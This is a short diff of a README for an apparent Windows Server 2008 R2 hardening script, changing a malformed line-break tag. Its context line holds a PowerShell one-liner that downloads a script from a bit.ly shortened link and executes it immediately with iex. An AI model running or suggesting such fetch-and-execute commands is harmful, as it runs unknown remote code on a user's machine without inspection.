@@ -1,5 +1,5 @@
 # 2008_R2_Hardening
-Private Download Script: <\br>
+Private Download Script: </br>
 powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://bit.ly/2QnDanB')"
 
 #Public Main Script:
